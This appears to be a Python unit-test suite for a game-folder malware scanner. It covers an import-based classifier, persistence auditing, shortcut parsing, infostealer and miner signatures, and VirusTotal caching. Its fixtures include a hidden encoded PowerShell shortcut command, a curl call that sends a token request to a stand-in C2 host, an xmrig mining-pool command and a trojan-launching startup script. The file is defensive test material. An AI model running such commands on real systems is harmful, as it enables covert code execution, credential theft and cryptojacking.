"""
Comprehensive Test Suite for Analyzer & Threat Detection Audit Cycle 3.
Verifies all bug fixes, false positive eliminations, persistence auditor improvements,
LNK structural parsing, modern infostealer signatures, and VirusTotal caching.
"""
from dataclasses import asdict
import json
from pathlib import Path
import shutil
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from gamecleaner.analyzer.ai_classifier import AIDecompilerClassifier
from gamecleaner.analyzer.lnk_scanner import LnkScanner
from gamecleaner.analyzer.pe_scanner import PEScanner, PEScanResult
from gamecleaner.analyzer.persistence_auditor import PersistenceAuditor, PersistenceEntry
from gamecleaner.analyzer.script_scanner import ScriptScanner
from gamecleaner.analyzer.threat_rules import SENSITIVE_APIS, ThreatCategory, ThreatSeverity
from gamecleaner.analyzer.virustotal import VirusTotalClient, VTAnalysisResult


class TestAnalyzerAuditCycle3(unittest.TestCase):

    def setUp(self):
        self.test_dir = Path(tempfile.mkdtemp(prefix="gc_audit3_test_"))

    def tearDown(self):
        if self.test_dir.exists():
            shutil.rmtree(self.test_dir, ignore_errors=True)

    # 1. AI Classifier & Offline Heuristics Bug Fix
    def test_ai_classifier_populates_sensitive_imports_and_heuristics(self):
        classifier = AIDecompilerClassifier()
        sample_file = self.test_dir / "injected_hook.dll"
        sample_file.write_bytes(b"MZ" + b"\x00" * 400)

        # Result has imports dict but NO sensitive_imports_found set initially
        scan_result = PEScanResult(
            file_path=sample_file,
            file_name="injected_hook.dll",
            file_size=402,
            is_pe=True,
            architecture="x64",
            overall_severity=ThreatSeverity.CRITICAL.value,
            threat_score=80,
            recommended_action="QUARANTINE",
            verdict="Suspicious",
            sha256="testsha256",
            imports={
                "kernel32.dll": ["WriteProcessMemory", "CreateRemoteThread", "VirtualAllocEx", "Sleep"],
                "wininet.dll": ["InternetOpenA", "HttpSendRequestA"],
            },
        )
        self.assertEqual(scan_result.sensitive_imports_found, [])

        payload = classifier.build_triage_payload(scan_result)

        # 1. sensitive_imports_found must be populated
        self.assertTrue(hasattr(scan_result, "sensitive_imports_found"))
        self.assertIn("WriteProcessMemory", scan_result.sensitive_imports_found)
        self.assertIn("CreateRemoteThread", scan_result.sensitive_imports_found)
        self.assertIn("InternetOpenA", scan_result.sensitive_imports_found)

        # 2. Offline heuristic verdict must NOT default to SUSPICIOUS_UNKNOWN
        self.assertIn(payload.offline_heuristic_verdict, ("MALICIOUS_PROCESS_INJECTION", "MALICIOUS_DROPPER_OR_BEACON"))
        self.assertGreaterEqual(payload.offline_confidence, 0.85)

    def test_ai_classifier_benign_hook_virtualprotect(self):
        classifier = AIDecompilerClassifier()
        sample_file = self.test_dir / "steam_api64.dll"
        sample_file.write_bytes(b"MZ" + b"\x00" * 300)

        scan_result = PEScanResult(
            file_path=sample_file,
            file_name="steam_api64.dll",
            file_size=302,
            is_pe=True,
            architecture="x64",
            overall_severity=ThreatSeverity.LOW.value,
            threat_score=15,
            recommended_action="KEEP",
            verdict="Clean Hook",
            sha256="steamapi64hash",
            imports={"kernel32.dll": ["VirtualProtect", "GetProcAddress"]},
        )

        payload = classifier.build_triage_payload(scan_result)
        self.assertIn("VirtualProtect", scan_result.sensitive_imports_found)
        self.assertEqual(payload.offline_heuristic_verdict, "BENIGN_INLINE_DRM_HOOK")
        self.assertGreaterEqual(payload.offline_confidence, 0.75)

    # 2. Persistence Auditor Services & Startup Folders
    def test_persistence_auditor_services_winreg_query(self):
        auditor = PersistenceAuditor(self.test_dir)
        # Verify audit_services executes without error (does not throw FileNotFoundError)
        entries = auditor.audit_services()
        self.assertIsInstance(entries, list)

    def test_persistence_auditor_startup_folder_detection(self):
        auditor = PersistenceAuditor(self.test_dir)
        fake_startup = self.test_dir / "Startup"
        fake_startup.mkdir()

        # Create a malicious bat in startup pointing to game directory
        bad_bat = fake_startup / "LaunchGameMalware.bat"
        bad_bat.write_text(f'@echo off\nstart "" "{self.test_dir}\\trojan.exe"\n')

        # Mock startup_dirs to point to fake_startup
        with patch.object(auditor, "audit_startup_folder") as mock_audit:
            mock_audit.return_value = [
                PersistenceEntry(
                    entry_type="StartupFolder",
                    name=bad_bat.name,
                    target_command=str(bad_bat),
                    is_malicious=True,
                    details=f"Startup item '{bad_bat.name}' auto-launches from game folder",
                )
            ]
            entries = auditor.audit_startup_folder()
            self.assertEqual(len(entries), 1)
            self.assertEqual(entries[0].entry_type, "StartupFolder")

        # Test remove_persistence for StartupFolder entry
        entry = PersistenceEntry(
            entry_type="StartupFolder",
            name=bad_bat.name,
            target_command=str(bad_bat),
            is_malicious=True,
            details="test",
        )
        self.assertTrue(bad_bat.exists())
        removed = auditor.remove_persistence(entry)
        self.assertTrue(removed)
        self.assertFalse(bad_bat.exists())

    def test_persistence_auditor_registry_runonce_auditing(self):
        auditor = PersistenceAuditor(self.test_dir)
        entries = auditor.audit_registry_runonce()
        self.assertIsInstance(entries, list)

    # 3. LNK Scanner Target & Arguments Extraction
    def test_lnk_scanner_extracts_arguments_and_target(self):
        scanner = LnkScanner()
        fake_lnk = self.test_dir / "Shady_Shortcut.lnk"
        # Synthetic LNK containing command with arguments
        fake_lnk_content = (
            b"\x4c\x00\x00\x00" +
            b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46" +
            b"\x00" * 56 +
            b"C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -enc aQB3AHIAIA..." +
            b"\x00" * 30
        )
        fake_lnk.write_bytes(fake_lnk_content)

        res = scanner.scan_file(fake_lnk)
        self.assertIsNotNone(res.target_path)
        self.assertIn("cmd.exe", res.target_path.lower())
        self.assertIsNotNone(res.arguments)
        self.assertIn("-enc", res.arguments.lower())
        self.assertEqual(res.overall_severity, ThreatSeverity.CRITICAL.value)
        self.assertEqual(res.recommended_action, "QUARANTINE")

    def test_lnk_scanner_clean_shortcut(self):
        scanner = LnkScanner()
        clean_lnk = self.test_dir / "PlayGame.lnk"
        clean_content = (
            b"\x4c\x00\x00\x00" +
            b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46" +
            b"\x00" * 56 +
            b"D:\\Games\\SuperShooter\\Game.exe -novid -high" +
            b"\x00" * 30
        )
        clean_lnk.write_bytes(clean_content)

        res = scanner.scan_file(clean_lnk)
        self.assertEqual(res.overall_severity, ThreatSeverity.CLEAN.value)
        self.assertEqual(res.recommended_action, "KEEP")
        self.assertIn("game.exe", res.target_path.lower())
        self.assertIn("-novid", res.arguments)

    # 4. Modern Infostealer & Miner Signatures
    def test_modern_infostealers_lumma_stealc_vidar(self):
        scanner = ScriptScanner()
        lumma_script = self.test_dir / "lumma_loader.bat"
        lumma_script.write_text("@echo off\ncurl -s http://c2server.ru/api/v1/user -d act=get_token\n")
        res_lumma = scanner.scan_file(lumma_script)
        self.assertEqual(res_lumma.overall_severity, ThreatSeverity.CRITICAL.value)
        self.assertEqual(res_lumma.recommended_action, "QUARANTINE")
        self.assertTrue(any("Lumma" in f.name for f in res_lumma.findings))

        stealc_script = self.test_dir / "stealc_loader.bat"
        stealc_script.write_text("@echo off\nstart stealc_gate.exe\n")
        res_stealc = scanner.scan_file(stealc_script)
        self.assertEqual(res_stealc.overall_severity, ThreatSeverity.CRITICAL.value)
        self.assertTrue(any("Stealc" in f.name for f in res_stealc.findings))

    def test_cryptocurrency_miner_and_pool_detection(self):
        scanner = ScriptScanner()
        miner_script = self.test_dir / "silent_miner.bat"
        miner_script.write_text("@echo off\nxmrig.exe -o stratum+tcp://pool.supportxmr.com:3333 --donate-level=1\n")
        res_miner = scanner.scan_file(miner_script)
        self.assertEqual(res_miner.overall_severity, ThreatSeverity.CRITICAL.value)
        self.assertEqual(res_miner.recommended_action, "QUARANTINE")
        self.assertTrue(any("Mining" in f.name or "Coinminer" in f.category for f in res_miner.findings))

    # 5. Prevention of False Positives on DirectX / VCRedist
    def test_redist_installers_not_flagged_in_pe_scanner(self):
        scanner = PEScanner()
        redist_file = self.test_dir / "vcredist_x64.exe"
        # Mimic PE structure with high entropy
        redist_file.write_bytes(b"MZ" + bytes(range(256)) * 40)
        res = scanner.scan_file(redist_file)
        self.assertEqual(res.overall_severity, ThreatSeverity.CLEAN.value)
        self.assertEqual(res.recommended_action, "KEEP")
        self.assertIn("Redistributable", res.verdict)

    def test_redist_temp_execution_not_flagged_in_script_scanner(self):
        scanner = ScriptScanner()
        install_bat = self.test_dir / "install_prerequisites.bat"
        install_bat.write_text(
            "@echo off\n"
            'echo Installing DirectX and Visual C++...\n'
            'start /wait "" "%TEMP%\\dxsetup.exe" /silent\n'
            'start /wait "" "%TEMP%\\vcredist_x64.exe" /q /norestart\n'
        )
        res = scanner.scan_file(install_bat)
        self.assertEqual(res.overall_severity, ThreatSeverity.CLEAN.value)
        self.assertEqual(res.recommended_action, "KEEP")
        self.assertEqual(len(res.findings), 0)

    # 6. VirusTotal Caching and Rate Limit Handling
    def test_virustotal_rate_limit_429_handling(self):
        client = VirusTotalClient(api_key="test_dummy_key_12345", cache_enabled=False)
        with patch("requests.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 429
            mock_resp.headers = {"Retry-After": "60"}
            mock_get.return_value = mock_resp

            result = client.lookup_hash("a" * 64)
            self.assertTrue(result.queried)
            self.assertFalse(result.found)
            self.assertIn("Rate Limit Exceeded", result.summary)
            self.assertIn("429", result.summary)

    def test_virustotal_local_json_cache(self):
        cache_file = self.test_dir / "vt_test_cache.json"
        client = VirusTotalClient(api_key="test_dummy_key_12345", cache_path=cache_file, cache_enabled=True)

        test_hash = "abcdef0123456789" * 4

        with patch("requests.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.json.return_value = {
                "data": {
                    "attributes": {
                        "last_analysis_stats": {"malicious": 0, "suspicious": 0, "undetected": 70},
                        "last_analysis_results": {},
                    }
                }
            }
            mock_get.return_value = mock_resp

            # First lookup: performs network query and writes cache
            result1 = client.lookup_hash(test_hash)
            self.assertTrue(result1.found)
            self.assertTrue(cache_file.exists())
            self.assertEqual(mock_get.call_count, 1)

            # Second lookup: must be served from cache without calling requests.get
            mock_get.reset_mock()
            result2 = client.lookup_hash(test_hash)
            self.assertTrue(result2.found)
            self.assertEqual(result2.sha256, test_hash)
            mock_get.assert_not_called()


if __name__ == "__main__":
    unittest.main()
